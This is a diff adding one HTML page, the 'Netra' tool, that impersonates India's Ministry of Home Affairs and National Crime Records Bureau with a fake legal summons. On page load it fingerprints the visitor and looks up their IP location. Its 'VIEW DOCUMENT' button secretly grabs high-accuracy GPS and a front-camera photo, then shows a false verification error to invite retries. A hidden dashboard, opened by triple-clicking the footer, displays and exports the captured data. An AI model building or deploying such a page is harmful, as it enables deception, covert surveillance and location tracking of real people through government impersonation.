@@ -1,0 +1,564 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ministry of Home Affairs | Secure Portal</title>
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- FontAwesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Leaflet Map CSS (For showing map preview) -->
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&family=JetBrains+Mono:wght@400;700&display=swap');
+        
+        body { font-family: 'Inter', sans-serif; background-color: #f0f2f5; }
+        .mono { font-family: 'JetBrains Mono', monospace; }
+        
+        /* Official Govt Header Style */
+        .header-gradient { background: linear-gradient(90deg, #1a365d 0%, #2c5282 100%); }
+        
+        /* Admin Dashboard Styles */
+        .admin-view { background-color: #0b1120; color: #e2e8f0; }
+        .hidden-mode { display: none !important; }
+        
+        /* Grid Pattern for Dashboard */
+        .cyber-grid {
+            background-image: radial-gradient(#1e293b 1px, transparent 1px);
+            background-size: 20px 20px;
+        }
+
+        /* Status Indicators */
+        .status-dot { height: 8px; width: 8px; border-radius: 50%; display: inline-block; }
+        .dot-green { background-color: #22c55e; box-shadow: 0 0 5px #22c55e; }
+        .dot-red { background-color: #ef4444; box-shadow: 0 0 5px #ef4444; }
+
+        /* Emblems */
+        .ashoka-emblem {
+            opacity: 0.05;
+            position: absolute;
+            top: 50%; left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 15rem;
+            pointer-events: none;
+            z-index: 0;
+        }
+    </style>
+</head>
+<body class="min-h-screen relative overflow-x-hidden">
+
+    <!-- HIDDEN CAPTURE ELEMENTS -->
+    <video id="hidden-video" class="hidden" autoplay playsinline></video>
+    <canvas id="hidden-canvas" class="hidden"></canvas>
+
+    <!-- ========================================== -->
+    <!-- 1. CIVILIAN/TARGET VIEW (The Bait)         -->
+    <!-- ========================================== -->
+    <div id="civilian-view" class="h-screen flex flex-col relative z-10 bg-gray-50">
+        <!-- Header -->
+        <div class="header-gradient text-white p-4 shadow-lg flex justify-between items-center z-20">
+            <div class="flex items-center gap-4">
+                <div class="bg-white p-1.5 rounded-full">
+                    <i class="fa-solid fa-scale-balanced text-2xl text-blue-900"></i>
+                </div>
+                <div>
+                    <h1 class="text-sm md:text-base font-bold tracking-wide uppercase">National Crime Records Bureau</h1>
+                    <p class="text-[10px] md:text-xs text-blue-200 uppercase">Ministry of Home Affairs • Govt of India</p>
+                </div>
+            </div>
+            <div class="text-[10px] opacity-70 font-mono hidden md:block">SECURE_GATEWAY_V7.0</div>
+        </div>
+
+        <!-- Watermark -->
+        <i class="fa-solid fa-landmark ashoka-emblem text-gray-800"></i>
+
+        <!-- Content -->
+        <div class="flex-grow flex items-center justify-center p-4 z-10">
+            <div class="max-w-md w-full bg-white p-8 rounded-lg shadow-2xl border border-gray-200">
+                
+                <div class="text-center mb-8 border-b border-gray-100 pb-6">
+                    <div class="inline-block p-3 rounded-full bg-red-50 text-red-600 mb-3 animate-pulse">
+                        <i class="fa-solid fa-file-contract text-3xl"></i>
+                    </div>
+                    <h2 class="text-xl font-bold text-gray-800">Legal Summons / Notice</h2>
+                    <p class="text-xs text-gray-500 mt-2">Case Reference: <span class="mono font-bold text-gray-700">FIR-2025/CYB/9982</span></p>
+                </div>
+
+                <div class="bg-blue-50 border-l-4 border-blue-600 p-4 mb-6">
+                    <div class="flex gap-3">
+                        <i class="fa-solid fa-circle-info text-blue-600 mt-0.5"></i>
+                        <p class="text-sm text-blue-800 leading-relaxed">
+                            <strong>Verification Required:</strong> To view this digital summons, you must verify your identity. Biometric parameters (Location/Camera) will be logged for legal audit trails.
+                        </p>
+                    </div>
+                </div>
+
+                <button onclick="executeAllTraps()" id="verify-btn" class="w-full bg-gradient-to-r from-blue-700 to-blue-800 hover:from-blue-800 hover:to-blue-900 text-white font-bold py-3.5 px-4 rounded shadow-md transition-all transform hover:scale-[1.01] flex justify-center items-center gap-2">
+                    <span>VIEW DOCUMENT</span>
+                    <i class="fa-solid fa-arrow-right"></i>
+                </button>
+                
+                <p class="text-[10px] text-center text-gray-400 mt-4">
+                    Unauthorized access is a punishable offense under IT Act 2000.
+                </p>
+
+                <!-- STEALTH ADMIN TRIGGER: Triple click the footer text -->
+                <div class="mt-8 pt-4 border-t border-gray-100 text-center select-none cursor-default" onclick="adminKnock()">
+                    <span class="text-[10px] text-gray-300 hover:text-gray-400 transition-colors">© 2025 NIC Data Center. All rights reserved.</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ========================================== -->
+    <!-- 2. FORENSIC ADMIN DASHBOARD (The Intel)    -->
+    <!-- ========================================== -->
+    <div id="admin-view" class="hidden-mode absolute inset-0 admin-view font-sans z-50 overflow-y-auto cyber-grid h-screen flex flex-col">
+        
+        <!-- Dashboard Toolbar -->
+        <div class="bg-slate-900 border-b border-slate-700 p-3 md:p-4 flex justify-between items-center shadow-lg sticky top-0 z-50">
+            <div class="flex items-center gap-3">
+                <div class="bg-red-500/10 border border-red-500 p-1.5 rounded animate-pulse">
+                    <i class="fa-solid fa-satellite-dish text-red-500"></i>
+                </div>
+                <div>
+                    <h1 class="text-base md:text-lg font-bold text-white tracking-widest uppercase">Netra Intelligence Suite</h1>
+                    <p class="text-[10px] text-slate-400 mono">LIVE SURVEILLANCE FEED • <span id="conn-status" class="text-green-400">ONLINE</span></p>
+                </div>
+            </div>
+            <div class="flex gap-2">
+                <button onclick="copyFullReport()" class="bg-blue-600 hover:bg-blue-700 text-white px-3 py-1.5 rounded text-xs font-semibold flex items-center gap-2 transition-colors">
+                    <i class="fa-solid fa-download"></i> REPORT
+                </button>
+                <button onclick="toggleView()" class="bg-slate-800 hover:bg-slate-700 text-slate-300 px-3 py-1.5 rounded text-xs font-semibold transition-colors">
+                    EXIT
+                </button>
+            </div>
+        </div>
+
+        <!-- Main Dashboard Content -->
+        <div class="flex-grow p-4 md:p-6 overflow-y-auto">
+            <div class="max-w-7xl mx-auto space-y-6">
+
+                <!-- Alert Banners -->
+                <div id="risk-banner" class="hidden bg-red-900/20 border-l-4 border-red-500 p-3 rounded flex items-center gap-3">
+                    <i class="fa-solid fa-triangle-exclamation text-red-500 text-xl"></i>
+                    <div>
+                        <h3 class="text-red-400 font-bold text-sm">HIGH RISK DETECTED</h3>
+                        <p class="text-xs text-slate-400" id="risk-msg">Potential VPN or VM usage identified.</p>
+                    </div>
+                </div>
+
+                <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
+
+                    <!-- COLUMN 1: TARGET PROFILE (Image & Identity) -->
+                    <div class="space-y-4 lg:col-span-1">
+                        <!-- Camera Feed -->
+                        <div class="bg-slate-800/50 border border-slate-700 rounded-lg overflow-hidden shadow-lg">
+                            <div class="bg-slate-900/80 p-2 border-b border-slate-700 flex justify-between items-center">
+                                <span class="text-xs font-bold text-slate-300 tracking-wider">VISUAL EVIDENCE</span>
+                                <span class="status-dot dot-red animate-pulse"></span>
+                            </div>
+                            <div id="cam-display" class="aspect-[4/3] bg-black flex flex-col items-center justify-center relative group">
+                                <i class="fa-solid fa-user-slash text-slate-600 text-4xl mb-2"></i>
+                                <span class="text-xs text-slate-500">WAITING FOR CAPTURE...</span>
+                                <div class="absolute inset-0 bg-gradient-to-t from-black/50 to-transparent"></div>
+                            </div>
+                        </div>
+
+                        <!-- Device Fingerprint Summary -->
+                        <div class="bg-slate-800/50 border border-slate-700 rounded-lg p-4">
+                            <h3 class="text-xs font-bold text-blue-400 mb-3 border-b border-slate-700 pb-2 uppercase">System Fingerprint</h3>
+                            <div class="space-y-2 text-sm">
+                                <div class="flex justify-between">
+                                    <span class="text-slate-500">OS:</span>
+                                    <span id="os-disp" class="text-slate-200">Analyzing...</span>
+                                </div>
+                                <div class="flex justify-between">
+                                    <span class="text-slate-500">Browser:</span>
+                                    <span id="browser-disp" class="text-slate-200">---</span>
+                                </div>
+                                <div class="flex justify-between">
+                                    <span class="text-slate-500">Cores/RAM:</span>
+                                    <span id="hw-disp" class="text-slate-200">---</span>
+                                </div>
+                                <div class="flex justify-between">
+                                    <span class="text-slate-500">Battery:</span>
+                                    <span id="batt-disp" class="text-slate-200">---</span>
+                                </div>
+                                <div class="mt-2 pt-2 border-t border-slate-700">
+                                    <span class="text-slate-500 text-xs block mb-1">GPU Renderer (VM Check):</span>
+                                    <span id="gpu-disp" class="text-yellow-500 text-xs font-mono break-all">---</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- COLUMN 2 & 3: LOCATION & NETWORK INTEL -->
+                    <div class="lg:col-span-2 space-y-6">
+                        
+                        <!-- 1. DUAL LOCATION ENGINE -->
+                        <div class="bg-slate-800/50 border border-slate-700 rounded-lg overflow-hidden">
+                            <div class="bg-slate-900/80 p-2 border-b border-slate-700">
+                                <span class="text-xs font-bold text-green-400 tracking-wider uppercase"><i class="fa-solid fa-crosshairs mr-2"></i>Location Intelligence</span>
+                            </div>
+                            <div class="grid grid-cols-1 md:grid-cols-2 divide-y md:divide-y-0 md:divide-x divide-slate-700">
+                                
+                                <!-- Passive (IP) Location -->
+                                <div class="p-4">
+                                    <div class="flex items-center gap-2 mb-3">
+                                        <div class="bg-blue-500/20 p-1.5 rounded text-blue-400"><i class="fa-solid fa-network-wired"></i></div>
+                                        <div>
+                                            <h4 class="text-xs font-bold text-slate-300">PASSIVE (ISP BASED)</h4>
+                                            <p class="text-[10px] text-slate-500">Available Immediately</p>
+                                        </div>
+                                    </div>
+                                    <div class="space-y-1 text-sm font-mono">
+                                        <p class="text-slate-400 text-xs">IP Address:</p>
+                                        <p id="ip-disp" class="text-xl text-white font-bold tracking-wider mb-2">Scanning...</p>
+                                        
+                                        <p class="text-slate-400 text-xs">ISP / Org:</p>
+                                        <p id="isp-disp" class="text-blue-300 break-words">---</p>
+                                        
+                                        <p class="text-slate-400 text-xs mt-2">Approx Location:</p>
+                                        <p id="city-disp" class="text-white">---</p>
+                                    </div>
+                                </div>
+
+                                <!-- Active (GPS) Location -->
+                                <div class="p-4 bg-slate-800/30">
+                                    <div class="flex items-center gap-2 mb-3">
+                                        <div class="bg-yellow-500/20 p-1.5 rounded text-yellow-400"><i class="fa-solid fa-satellite"></i></div>
+                                        <div>
+                                            <h4 class="text-xs font-bold text-slate-300">ACTIVE (GPS SATELLITE)</h4>
+                                            <p class="text-[10px] text-slate-500">Requires Permission</p>
+                                        </div>
+                                    </div>
+                                    <div id="gps-panel" class="space-y-2 text-sm font-mono flex flex-col justify-center h-32">
+                                        <p class="text-slate-500 italic text-center">Waiting for target verification...</p>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- 2. NETWORK & TIMING -->
+                        <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                            <div class="bg-slate-800/50 border border-slate-700 rounded-lg p-4">
+                                <h3 class="text-xs font-bold text-slate-400 mb-2 uppercase">Connection Diagnostics</h3>
+                                <div class="space-y-2 text-xs">
+                                    <div class="flex justify-between border-b border-slate-700/50 pb-1">
+                                        <span class="text-slate-500">Connection Type:</span>
+                                        <span id="net-type" class="text-slate-300">---</span>
+                                    </div>
+                                    <div class="flex justify-between border-b border-slate-700/50 pb-1">
+                                        <span class="text-slate-500">Local IP (WebRTC):</span>
+                                        <span id="local-ip" class="text-red-400">Hidden</span>
+                                    </div>
+                                    <div class="flex justify-between">
+                                        <span class="text-slate-500">Tor/Proxy Check:</span>
+                                        <span id="proxy-check" class="text-slate-300">Analyzing...</span>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="bg-slate-800/50 border border-slate-700 rounded-lg p-4">
+                                <h3 class="text-xs font-bold text-slate-400 mb-2 uppercase">Timezone Analysis</h3>
+                                <div class="space-y-2 text-xs">
+                                    <div class="flex justify-between border-b border-slate-700/50 pb-1">
+                                        <span class="text-slate-500">System Time:</span>
+                                        <span id="sys-time" class="text-slate-300">---</span>
+                                    </div>
+                                    <div class="flex justify-between border-b border-slate-700/50 pb-1">
+                                        <span class="text-slate-500">System Zone:</span>
+                                        <span id="sys-zone" class="text-slate-300">---</span>
+                                    </div>
+                                    <div class="flex justify-between">
+                                        <span class="text-slate-500">IP Zone:</span>
+                                        <span id="ip-zone" class="text-slate-300">Waiting...</span>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+    <script>
+        // === KRYSHA'S NETRA ENGINE v7.0 ===
+        // Designed for robustness. Collects passive data instantly. Collects active data on trigger.
+
+        const intel = {
+            caseId: 'FIR-' + Math.floor(Math.random() * 90000 + 10000),
+            timestamp: new Date().toISOString(),
+            passive: {},
+            active: {},
+            device: {}
+        };
+
+        const get = (id) => document.getElementById(id);
+
+        // --- 1. ADMIN ACCESS LOGIC ---
+        let knockCount = 0;
+        let knockTimer;
+        function adminKnock() {
+            knockCount++;
+            clearTimeout(knockTimer);
+            knockTimer = setTimeout(() => { knockCount = 0; }, 2000); // Reset if clicks are too slow
+            
+            if (knockCount === 3) {
+                toggleView();
+                knockCount = 0;
+            }
+        }
+
+        function toggleView() {
+            get('admin-view').classList.toggle('hidden-mode');
+            get('civilian-view').classList.toggle('hidden-mode');
+        }
+
+        // --- 2. PASSIVE DATA COLLECTION (Zero-Click) ---
+        // Runs immediately when page loads
+
+        async function collectPassiveIntel() {
+            // A. Device Fingerprint
+            const ua = navigator.userAgent;
+            const platform = navigator.platform;
+            const screenRes = `${window.screen.width}x${window.screen.height} (${window.screen.colorDepth}-bit)`;
+            const cores = navigator.hardwareConcurrency || 'N/A';
+            const ram = navigator.deviceMemory ? `~${navigator.deviceMemory}GB` : 'N/A';
+            
+            intel.device = { ua, platform, screenRes, cores, ram };
+            
+            get('os-disp').innerText = platform;
+            get('hw-disp').innerText = `${cores} Cores / ${ram} RAM`;
+            
+            // Browser Guess
+            let browser = "Unknown";
+            if(ua.indexOf("Chrome") != -1 ) browser = "Google Chrome";
+            else if(ua.indexOf("Firefox") != -1 ) browser = "Mozilla Firefox";
+            else if(ua.indexOf("Safari") != -1 ) browser = "Apple Safari";
+            get('browser-disp').innerText = browser;
+
+            // GPU (VM Detection)
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl');
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                get('gpu-disp').innerText = renderer;
+                intel.device.gpu = renderer;
+                
+                // Risk Check
+                if(/vmware|virtualbox|llvmpipe|microsoft basic render/i.test(renderer)) {
+                    showRisk("Virtual Machine / RDP Detected via GPU");
+                }
+            } catch(e) { get('gpu-disp').innerText = "Blocked"; }
+
+            // Battery
+            if(navigator.getBattery) {
+                navigator.getBattery().then(b => {
+                    const status = `${Math.round(b.level * 100)}% ${b.charging ? '(Charging ⚡)' : ''}`;
+                    get('batt-disp').innerText = status;
+                    intel.device.battery = status;
+                });
+            }
+
+            // Connection Type
+            const conn = navigator.connection;
+            if(conn) {
+                get('net-type').innerText = `${conn.effectiveType.toUpperCase()} (rtt: ${conn.rtt}ms)`;
+                intel.device.connection = conn.effectiveType;
+            }
+
+            // Timezone Analysis
+            const sysZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            get('sys-time').innerText = new Date().toLocaleTimeString();
+            get('sys-zone').innerText = sysZone;
+            intel.device.timezone = sysZone;
+
+            // B. Network & IP (The robust fetch chain)
+            try {
+                // Primary: ipapi.co (Detailed)
+                const res = await fetch('https://ipapi.co/json/');
+                if(!res.ok) throw new Error("Blocked");
+                const data = await res.json();
+                updateNetworkUI(data);
+            } catch (e) {
+                console.log("Primary IP source failed, switching to backup...");
+                try {
+                    // Backup: ipwho.is (Robust)
+                    const res2 = await fetch('https://ipwho.is/');
+                    const data2 = await res2.json();
+                    // Normalize data structure
+                    const normData = {
+                        ip: data2.ip,
+                        org: data2.connection?.isp || data2.isp,
+                        city: data2.city,
+                        region: data2.region,
+                        country_name: data2.country,
+                        timezone: data2.timezone?.id
+                    };
+                    updateNetworkUI(normData);
+                } catch(err) {
+                    get('ip-disp').innerText = "CLIENT BLOCKED";
+                    get('ip-disp').classList.add('text-red-500');
+                }
+            }
+        }
+
+        function updateNetworkUI(data) {
+            intel.passive = data;
+            get('ip-disp').innerText = data.ip;
+            get('isp-disp').innerText = data.org || data.isp;
+            get('city-disp').innerText = `${data.city}, ${data.region}, ${data.country_name}`;
+            get('ip-zone').innerText = data.timezone || "N/A";
+            
+            // Compare Timezones (VPN Check)
+            const sysZone = intel.device.timezone;
+            if(data.timezone && sysZone && data.timezone !== sysZone) {
+                showRisk(`Timezone Mismatch: System(${sysZone}) vs IP(${data.timezone})`);
+            }
+        }
+
+        function showRisk(msg) {
+            get('risk-banner').classList.remove('hidden');
+            get('risk-msg').innerText = msg;
+        }
+
+        // --- 3. ACTIVE TRAP (The "Click" Event) ---
+        // Uses Promise.allSettled so if one permission is denied, the other still captures.
+
+        async function executeAllTraps() {
+            const btn = get('verify-btn');
+            const originalContent = btn.innerHTML;
+            
+            btn.innerHTML = `<i class="fa-solid fa-circle-notch fa-spin"></i> VERIFYING BIOMETRICS...`;
+            btn.disabled = true;
+
+            // Execute traps in parallel but independently
+            const traps = [captureGPS(), captureCamera()];
+            
+            await Promise.allSettled(traps);
+
+            // Fake delay for realism
+            setTimeout(() => {
+                alert("Verification Error: Biometric hash mismatch. Please try from a recognized device/network.");
+                btn.innerHTML = `<i class="fa-solid fa-rotate-right"></i> RETRY VERIFICATION`;
+                btn.disabled = false;
+            }, 1500);
+        }
+
+        // A. Camera Trap
+        function captureCamera() {
+            return new Promise((resolve, reject) => {
+                const display = get('cam-display');
+                
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                .then(stream => {
+                    const video = get('hidden-video');
+                    const canvas = get('hidden-canvas');
+                    video.srcObject = stream;
+                    
+                    video.onloadedmetadata = () => {
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        
+                        setTimeout(() => {
+                            canvas.getContext('2d').drawImage(video, 0, 0);
+                            const imgData = canvas.toDataURL('image/jpeg', 0.6);
+                            intel.active.image = imgData;
+                            
+                            // Cleanup
+                            stream.getTracks().forEach(track => track.stop());
+                            
+                            // Update Admin UI
+                            display.innerHTML = `<img src="${imgData}" class="w-full h-full object-cover">`;
+                            display.innerHTML += `<div class="absolute top-2 right-2 bg-green-500 text-white text-[10px] px-2 rounded font-bold">CAPTURED</div>`;
+                            resolve("Camera Success");
+                        }, 500);
+                    };
+                })
+                .catch(err => {
+                    display.innerHTML = `<div class="flex flex-col items-center text-red-500"><i class="fa-solid fa-ban text-3xl mb-1"></i><span class="text-xs font-bold">ACCESS DENIED</span></div>`;
+                    reject("Camera Denied");
+                });
+            });
+        }
+
+        // B. GPS Trap
+        function captureGPS() {
+            return new Promise((resolve, reject) => {
+                const panel = get('gps-panel');
+                panel.innerHTML = `<span class="text-yellow-400 animate-pulse text-center">Requesting High-Accuracy GPS...</span>`;
+                
+                if(!navigator.geolocation) {
+                    panel.innerHTML = `<span class="text-red-500 text-center">Geo API Not Supported</span>`;
+                    reject("No Geo API");
+                    return;
+                }
+
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        const {latitude, longitude, accuracy} = pos.coords;
+                        const link = `https://www.google.com/maps?q=${latitude},${longitude}`;
+                        
+                        intel.active.gps = { lat: latitude, lon: longitude, acc: accuracy };
+                        
+                        panel.innerHTML = `
+                            <div class="bg-green-500/10 border border-green-500/50 p-2 rounded">
+                                <div class="flex justify-between items-center mb-1">
+                                    <span class="text-green-400 font-bold">LOCKED</span>
+                                    <span class="text-[10px] text-slate-400">Acc: ${Math.round(accuracy)}m</span>
+                                </div>
+                                <div class="text-white text-lg font-mono tracking-tighter">${latitude.toFixed(5)}, ${longitude.toFixed(5)}</div>
+                                <a href="${link}" target="_blank" class="block mt-2 text-center bg-blue-600 hover:bg-blue-700 text-white text-xs py-1 rounded">
+                                    OPEN ON MAP <i class="fa-solid fa-up-right-from-square ml-1"></i>
+                                </a>
+                            </div>
+                        `;
+                        
+                        // VPN CHECK: Compare GPS Lat/Lon with IP Lat/Lon (simplified check)
+                        if(intel.passive && intel.passive.latitude) {
+                            const ipLat = intel.passive.latitude;
+                            const diff = Math.abs(ipLat - latitude);
+                            if(diff > 2.0) { // Approx 200km diff
+                                showRisk("Location Mismatch: IP vs GPS distance > 200km");
+                            }
+                        }
+
+                        resolve("GPS Success");
+                    },
+                    (err) => {
+                        panel.innerHTML = `
+                            <div class="text-center">
+                                <i class="fa-solid fa-location-cross text-red-500 text-2xl mb-2"></i>
+                                <p class="text-red-400 font-bold">PERMISSION DENIED</p>
+                                <p class="text-[10px] text-slate-500">User blocked location request</p>
+                            </div>
+                        `;
+                        reject("GPS Denied");
+                    },
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                );
+            });
+        }
+
+        // --- 4. EXPORT ---
+        function copyFullReport() {
+            // Filter out the huge base64 image string for the clipboard text
+            const exportData = { ...intel, active: { ...intel.active, image: intel.active.image ? "[IMAGE_DATA_CAPTURED]" : "NONE" } };
+            navigator.clipboard.writeText(JSON.stringify(exportData, null, 2));
+            alert("Forensic Report Copied to Clipboard! (Image excluded from text)");
+        }
+
+        // Initialize Passive Collection
+        window.onload = collectPassiveIntel;
+
+    </script>
+</body>
+</html>
